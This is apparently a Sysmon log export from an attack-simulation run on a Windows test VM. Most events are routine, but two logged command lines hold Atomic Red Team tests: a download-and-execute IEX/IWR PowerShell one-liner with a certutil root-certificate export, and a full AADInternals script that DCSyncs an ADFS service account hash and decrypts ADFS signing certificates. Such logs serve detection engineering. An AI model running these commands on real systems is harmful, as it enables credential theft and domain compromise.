Microsoft-Windows-Sysmon/Operational,taskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly,Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Host Process for Windows Tasks,,,,,,1,9473,10.0.22621.1635 (WinBuild.160101.0800),"MD5=4887A65FD4F6598AF4986CBC1C0E5488,SHA256=82472A84BCBB4009ADD338200F8E853FE4C5EAFE2E2C3A2D711B85BF29B72D54,IMPHASH=1C4E2D9936E4D9F2490B08AAB4D24260",C:\Windows\System32\taskhostw.exe,,System,0x8000000000000000,Information,{fda94052-34eb-658d-e703-000000000000},0x3e7,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:25:56.390

ProcessGuid: {fda94052-3f24-658d-7702-000000000b00}

ProcessId: 8712

Image: C:\Windows\System32\taskhostw.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Host Process for Windows Tasks

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: taskhostw.exe

CommandLine: taskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {fda94052-34eb-658d-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 0

IntegrityLevel: System

Hashes: MD5=4887A65FD4F6598AF4986CBC1C0E5488,SHA256=82472A84BCBB4009ADD338200F8E853FE4C5EAFE2E2C3A2D711B85BF29B72D54,IMPHASH=1C4E2D9936E4D9F2490B08AAB4D24260

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1900

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,taskhostw.exe,-,-,{00000000-0000-0000-0000-000000000000},1900,-,{fda94052-3f24-658d-7702-000000000b00},7044,8712,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:25:56.3926284Z,,Process Create (rule: ProcessCreate),0,6672,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-28 09:25:56.390,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:25:56.3926284Z""/>
      <EventRecordID>9473</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:25:56.390</Data>
      <Data Name=""ProcessGuid"">{fda94052-3f24-658d-7702-000000000b00}</Data>
      <Data Name=""ProcessId"">8712</Data>
      <Data Name=""Image"">C:\Windows\System32\taskhostw.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1635 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Host Process for Windows Tasks</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">taskhostw.exe</Data>
      <Data Name=""CommandLine"">taskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
      <Data Name=""LogonGuid"">{fda94052-34eb-658d-e703-000000000000}</Data>
      <Data Name=""LogonId"">0x3e7</Data>
      <Data Name=""TerminalSessionId"">0</Data>
      <Data Name=""IntegrityLevel"">System</Data>
      <Data Name=""Hashes"">MD5=4887A65FD4F6598AF4986CBC1C0E5488,SHA256=82472A84BCBB4009ADD338200F8E853FE4C5EAFE2E2C3A2D711B85BF29B72D54,IMPHASH=1C4E2D9936E4D9F2490B08AAB4D24260</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1900</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:25:56.390

ProcessGuid: {fda94052-3f24-658d-7702-000000000b00}

ProcessId: 8712

Image: C:\Windows\System32\taskhostw.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Host Process for Windows Tasks

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: taskhostw.exe

CommandLine: taskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {fda94052-34eb-658d-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 0

IntegrityLevel: System

Hashes: MD5=4887A65FD4F6598AF4986CBC1C0E5488,SHA256=82472A84BCBB4009ADD338200F8E853FE4C5EAFE2E2C3A2D711B85BF29B72D54,IMPHASH=1C4E2D9936E4D9F2490B08AAB4D24260

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1900

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,lb-140-82-121-3-fra.github.com,140.82.121.3,false,443,https,3,9472,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,true,,0x8000000000000000,Information,,,"Network connection detected:

RuleName: -

UtcTime: 2023-12-27 23:54:47.592

ProcessGuid: {fda94052-3f21-658d-7502-000000000b00}

ProcessId: 11004

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User

Protocol: tcp

Initiated: true

SourceIsIpv6: false

SourceIp: 192.168.126.164

SourceHostname: WinDev2309Eval.localdomain

SourcePort: 59360

SourcePortName: -

DestinationIsIpv6: false

DestinationIp: 140.82.121.3

DestinationHostname: lb-140-82-121-3-fra.github.com

DestinationPort: 443

DestinationPortName: https",Info,,,,,,,{fda94052-3f21-658d-7502-000000000b00},7044,11004,,tcp,,,,"
      ",-,WinDev2309Eval.localdomain,192.168.126.164,false,59360,-,2023-12-28T09:25:56.3896952Z,,Network connection detected (rule: NetworkConnect),,5204,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 23:54:47.592,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>3</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>3</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:25:56.3896952Z""/>
      <EventRecordID>9472</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""5204""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 23:54:47.592</Data>
      <Data Name=""ProcessGuid"">{fda94052-3f21-658d-7502-000000000b00}</Data>
      <Data Name=""ProcessId"">11004</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""Protocol"">tcp</Data>
      <Data Name=""Initiated"">true</Data>
      <Data Name=""SourceIsIpv6"">false</Data>
      <Data Name=""SourceIp"">192.168.126.164</Data>
      <Data Name=""SourceHostname"">WinDev2309Eval.localdomain</Data>
      <Data Name=""SourcePort"">59360</Data>
      <Data Name=""SourcePortName"">-</Data>
      <Data Name=""DestinationIsIpv6"">false</Data>
      <Data Name=""DestinationIp"">140.82.121.3</Data>
      <Data Name=""DestinationHostname"">lb-140-82-121-3-fra.github.com</Data>
      <Data Name=""DestinationPort"">443</Data>
      <Data Name=""DestinationPortName"">https</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Network connection detected:

RuleName: -

UtcTime: 2023-12-27 23:54:47.592

ProcessGuid: {fda94052-3f21-658d-7502-000000000b00}

ProcessId: 11004

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User

Protocol: tcp

Initiated: true

SourceIsIpv6: false

SourceIp: 192.168.126.164

SourceHostname: WinDev2309Eval.localdomain

SourcePort: 59360

SourcePortName: -

DestinationIsIpv6: false

DestinationIp: 140.82.121.3

DestinationHostname: lb-140-82-121-3-fra.github.com

DestinationPort: 443

DestinationPortName: https</Message>
      <Level>Information</Level>
      <Task>Network connection detected (rule: NetworkConnect)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:25:53.747,,,,,,,,11,9471,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 09:25:53.747

ProcessGuid: {fda94052-3f21-658d-7502-000000000b00}

ProcessId: 11004

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_5h4ywptp.qxs.ps1

CreationUtcTime: 2023-12-28 09:25:53.747

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-3f21-658d-7502-000000000b00},7044,11004,,,,,,"
      ",-,,,,,,2023-12-28T09:25:53.7531197Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_5h4ywptp.qxs.ps1,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:25:53.747,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:25:53.7531197Z""/>
      <EventRecordID>9471</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:25:53.747</Data>
      <Data Name=""ProcessGuid"">{fda94052-3f21-658d-7502-000000000b00}</Data>
      <Data Name=""ProcessId"">11004</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_5h4ywptp.qxs.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:25:53.747</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 09:25:53.747

ProcessGuid: {fda94052-3f21-658d-7502-000000000b00}

ProcessId: 11004

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_5h4ywptp.qxs.ps1

CreationUtcTime: 2023-12-28 09:25:53.747

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) 
certutil.exe -p password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 c:\temp\atomic.pfx}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,9470,10.0.22621.2215 (WinBuild.160101.0800),"MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:25:53.621

ProcessGuid: {fda94052-3f21-658d-7502-000000000b00}

ProcessId: 11004

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) 
certutil.exe -p password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 c:\temp\atomic.pfx}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User",Info,PowerShell.EXE,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-b87a-658c-2702-000000000b00},5076,WINDEV2309EVAL\User,{fda94052-3f21-658d-7502-000000000b00},7044,11004,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:25:53.6224653Z,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:25:53.621,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:25:53.6224653Z""/>
      <EventRecordID>9470</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:25:53.621</Data>
      <Data Name=""ProcessGuid"">{fda94052-3f21-658d-7502-000000000b00}</Data>
      <Data Name=""ProcessId"">11004</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2215 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) 
certutil.exe -p password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 c:\temp\atomic.pfx}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b87a-658c-2702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5076</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:25:53.621

ProcessGuid: {fda94052-3f21-658d-7502-000000000b00}

ProcessId: 11004

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) 
certutil.exe -p password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 c:\temp\atomic.pfx}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:25:51.726,,,,,,,,11,9469,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 09:25:51.726

ProcessGuid: {fda94052-3f1f-658d-7302-000000000b00}

ProcessId: 9568

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_25mkfene.jzt.ps1

CreationUtcTime: 2023-12-28 09:25:51.726

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-3f1f-658d-7302-000000000b00},7044,9568,,,,,,"
      ",-,,,,,,2023-12-28T09:25:51.7368680Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_25mkfene.jzt.ps1,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:25:51.726,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:25:51.7368680Z""/>
      <EventRecordID>9469</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:25:51.726</Data>
      <Data Name=""ProcessGuid"">{fda94052-3f1f-658d-7302-000000000b00}</Data>
      <Data Name=""ProcessId"">9568</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_25mkfene.jzt.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:25:51.726</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 09:25:51.726

ProcessGuid: {fda94052-3f1f-658d-7302-000000000b00}

ProcessId: 9568

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_25mkfene.jzt.ps1

CreationUtcTime: 2023-12-28 09:25:51.726

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {Import-Module ActiveDirectory -Force 
Import-Module AADInternals -Force | Out-Null
#Get Configuration
$dcServerName = (Get-ADDomainController).HostName
$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \""""adfs_svc\""""
$PWord = ConvertTo-SecureString -String \""""ReallyStrongPassword\"""" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList Administrator, $PWord
# use DCSync to fetch the ADFS service account's NT hash
$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex
$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server sts.contoso.com
# Get certificates decryption key
$Configuration = [xml]$ADFSConfig
$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group
$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName
$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn
$base = \""""LDAP://CN=$group,$container,$parent\""""
$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))
$ADSearch.Filter = '(name=CryptoPolicy)'
$ADSearch.PropertiesToLoad.Clear()
$ADSearch.PropertiesToLoad.Add(\""""displayName\"""") | Out-Null
$aduser = $ADSearch.FindOne()
$keyObjectGuid = $ADUser.Properties[\""""displayName\""""] 
$ADSearch.PropertiesToLoad.Clear()
$ADSearch.PropertiesToLoad.Add(\""""thumbnailphoto\"""") | Out-Null
$ADSearch.Filter=\""""(l=$keyObjectGuid)\""""
$aduser=$ADSearch.FindOne() 
$key=[byte[]]$aduser.Properties[\""""thumbnailphoto\""""][0] 
# Get encrypted certificates from configuration and decrypt them
Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key
Get-ChildItem | Where-Object {$_ -like \""""ADFS*\""""}
Write-Host \""""`nCertificates retrieved successfully\""""}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,9468,10.0.22621.2215 (WinBuild.160101.0800),"MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:25:51.581

ProcessGuid: {fda94052-3f1f-658d-7302-000000000b00}

ProcessId: 9568

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {Import-Module ActiveDirectory -Force 
Import-Module AADInternals -Force | Out-Null
#Get Configuration
$dcServerName = (Get-ADDomainController).HostName
$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \""""adfs_svc\""""
$PWord = ConvertTo-SecureString -String \""""ReallyStrongPassword\"""" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList Administrator, $PWord
# use DCSync to fetch the ADFS service account's NT hash
$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex
$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server sts.contoso.com
# Get certificates decryption key
$Configuration = [xml]$ADFSConfig
$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group
$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName
$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn
$base = \""""LDAP://CN=$group,$container,$parent\""""
$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))
$ADSearch.Filter = '(name=CryptoPolicy)'
$ADSearch.PropertiesToLoad.Clear()
$ADSearch.PropertiesToLoad.Add(\""""displayName\"""") | Out-Null
$aduser = $ADSearch.FindOne()
$keyObjectGuid = $ADUser.Properties[\""""displayName\""""] 
$ADSearch.PropertiesToLoad.Clear()
$ADSearch.PropertiesToLoad.Add(\""""thumbnailphoto\"""") | Out-Null
$ADSearch.Filter=\""""(l=$keyObjectGuid)\""""
$aduser=$ADSearch.FindOne() 
$key=[byte[]]$aduser.Properties[\""""thumbnailphoto\""""][0] 
# Get encrypted certificates from configuration and decrypt them
Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key
Get-ChildItem | Where-Object {$_ -like \""""ADFS*\""""}
Write-Host \""""`nCertificates retrieved successfully\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User",Info,PowerShell.EXE,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-b87a-658c-2702-000000000b00},5076,WINDEV2309EVAL\User,{fda94052-3f1f-658d-7302-000000000b00},7044,9568,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:25:51.5827351Z,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:25:51.581,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:25:51.5827351Z""/>
      <EventRecordID>9468</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:25:51.581</Data>
      <Data Name=""ProcessGuid"">{fda94052-3f1f-658d-7302-000000000b00}</Data>
      <Data Name=""ProcessId"">9568</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2215 (WinBuild.160101.0800)</Data>
